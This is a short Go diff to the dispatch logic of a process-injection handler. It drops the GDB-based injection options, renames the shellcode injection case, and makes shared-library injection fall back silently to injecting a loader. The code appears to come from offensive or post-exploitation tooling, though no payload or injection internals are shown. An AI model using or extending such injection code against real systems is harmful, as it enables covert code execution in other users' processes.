@@ -166,30 +166,20 @@ func InjectorHandler(pid int, method string) (err error) {
 
 	// dispatch
 	switch method {
-	case "gdb_loader":
-		err = GDBInjectLoader(pid)
 
-	case "gdb_shared_lib":
-		so_path, e := prepare_shared_lib()
-		if e != nil {
-			return e
-		}
-		err = gdbInjectSharedLibWorker(so_path, pid)
-
-	case "inject_shellcode":
+	case "shellcode":
 		shellcode, _ := prepare_sc(pid)
 		err = ShellcodeInjector(&shellcode, pid)
 		if err != nil {
 			return
 		}
 
-	case "inject_loader":
-		err = InjectLoader(pid)
-
 	case "shared_library":
 		so_path, e := prepare_shared_lib()
 		if e != nil {
-			return e
+			log.Printf("Injecting loader.so instead")
+			err = InjectLoader(pid)
+			return err
 		}
 		err = InjectSharedLib(so_path, pid)
 
